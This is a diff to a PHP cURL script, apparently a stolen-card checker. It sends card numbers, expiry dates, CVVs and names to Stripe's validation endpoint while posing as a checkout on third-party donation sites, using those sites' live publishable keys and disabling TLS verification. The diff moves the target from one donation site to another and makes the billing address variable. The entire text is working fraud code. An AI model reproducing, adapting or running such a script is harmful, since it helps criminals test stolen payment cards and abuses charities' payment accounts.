@@ -79,7 +79,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br', 
 'content-type: application/x-www-form-urlencoded',
 'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=025e7b23-32c4-08b7-a83f-8a07e6f46158',
+'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=899ff7e3-275f-f785-ebd8-66e96c8f7a51',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'));
@@ -90,7 +90,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.jeremynixon.ca%2Fdonate%2F&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&card[address_line1]=Christopher+StreetCoastal+Highway&card[address_city]=New+York&card[address_state]=NY&card[address_zip]=10080&card[address_country]=United+States&time_on_page=368462&guid=5de8767d-7feb-434c-b315-c3315228a77f&muid=7e861fb5-8d24-4a59-92b1-b5c8ca1aca29&sid=5ccd34d8-26ff-4621-a785-9f05551183ec&key=pk_live_fs8tDGN6Gfduz6XOivIUqT8j');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fhuntsvillefestival.ca%2Fdonate%2F&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&card[address_line1]='.$street.'&card[address_city]='.$city.'&card[address_state]='.$state.'&card[address_zip]='.$zip.'&card[address_country]=United+States&time_on_page=82741&guid=5de8767d-7feb-434c-b315-c3315228a77f&muid=47b10915-3372-43be-9552-8942121c3e72&sid=c95b255c-74fb-432a-9e77-4d1bfa55c27a&key=pk_live_XctzvztiekWf9dJeEn5E7py8');
 
 $result = curl_exec($ch);
 
@@ -122,7 +122,7 @@ $result = curl_exec($ch);
   'sec-fetch-mode: ',
   'sec-fetch-dest: ',
   'sec-fetch-site: ',  */
-////));
+/////////////////////////////));
 ///curl_setopt($ch, CURLOPT_POSTFIELDS, '');
 
 //$result = curl_exec($ch);
